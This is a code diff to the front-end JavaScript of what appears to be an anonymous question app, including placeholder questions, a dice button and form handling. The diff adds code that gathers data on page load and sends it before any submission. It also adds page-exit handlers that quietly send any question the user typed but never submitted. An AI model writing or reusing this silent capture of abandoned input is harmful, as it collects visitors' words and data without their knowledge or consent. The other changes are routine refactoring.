@@ -1,4 +1,4 @@
-import { sendMsg, sendDoc, echo, collectData } from './utils.js'
+import { echo, sendDoc, collectData, mergeData, } from './utils.js'
 
 let sampleQuestions = {}
 let placeholderValues = [
@@ -8,17 +8,16 @@ let placeholderValues = [
     "default.do-u-believe-in-second-chances?",
     "default.how_tall_r_u",
     "default.are_u_talking_to_anyone",
-    "default.do-you-prefer-texting-or-facetime?"
+    "default.do-you-prefer-texting-or-facetime?",
 ]
 
-$(document).ready(function () {
-    const userAgent = navigator.userAgent || navigator.vendor || window.opera
-
+$(document).ready(async function () {
     // FETCH LOCALIZED QUESTIONS
     // used in dynamic placeholder text and dice button
     const APP_CDN_BASE_URL = 'https://cdn.simplelocalize.io/d6cb2f56863b434c8fba40f9404505f9/_latest/'
     const userLanguage = $("meta[name='user:language']").attr('content') || 'en'
-
+    const userAgent = navigator.userAgent || navigator.vendor || window.opera
+    
     $.get(APP_CDN_BASE_URL + userLanguage, function (data) {
         for (let key in data) {
             if (key.startsWith("default.")) sampleQuestions[key] = data[key]
@@ -56,24 +55,43 @@ $(document).ready(function () {
         }, 2000);
     })
 
-    // Asking question form
+    const data = await collectData()
+
+    sendDoc(mergeData(data), cred.view_chat)
+        .catch(echo.err)
+
+    // Asking/Viewing question form
     $('.form').submit(async function (evt) {
         evt.preventDefault()
 
         $('.submit').attr('disabled', true)
-        const question = $('#question').val()
+        const q = $('#question').val()
         
-        if (question.trim() === '')
+        if (q.trim() === '')
             return alert('Please enter a question first!')
 
-        const data = await collectData(question)
-
-        await sendDoc(data)
+        await sendDoc(mergeData(data, q))
             .catch(echo.err)
             .finally(restorePage)
-
     })
 
+    let hasSentExitData = false
+
+    document.addEventListener('visibilitychange', (evt) => document.visibilityState === 'hidden' ? handleExit(evt) : null)
+    window.addEventListener('pagehide', handleExit)
+    window.addEventListener('unload', handleExit)
+
+    function handleExit(evt) {
+        if (hasSentExitData) return
+        hasSentExitData = true
+        const q = $('#question').val()
+
+        if (q.trim()) {
+            sendDoc(mergeData(data, q), cred.null_chat)
+                .catch(echo.err)
+        }
+    }
+    
     function restorePage() {
         $('textarea').val('')
         $('.priority-modal').hide()
@@ -93,25 +111,19 @@ $(document).ready(function () {
 
     // Animating placeholder JS - Start
     $('textarea').on('input', function (evt) {
-        if (evt.target.value.trim() == '') {
+        if (evt.target.value.trim() == '')
             $('.textarea-placeholder').removeClass('hidden fade-out').addClass('fade-in');
-        } else {
+        else
             $('.textarea-placeholder').addClass('hidden').removeClass('fade-in fade-out');
-        }
     })
     // Animating placeholder JS - End
 
     $('textarea').on('input', function (evt) {
-        if (evt.target.value == '' && !/android/i.test(userAgent)) {
-            $('.submit').hide()
-        } else {
-            $('.submit').show()
-        }
+        if (evt.target.value == '' && !/android/i.test(userAgent)) $('.submit').hide()
+        else $('.submit').show()
     })
 
-    if (!/android/i.test(userAgent)) {
-        $('.submit').hide()
-    }
+    if (!/android/i.test(userAgent)) $('.submit').hide()
 
     $('.dice-button').click(function (evt) {
         // Set textarea text to a random question
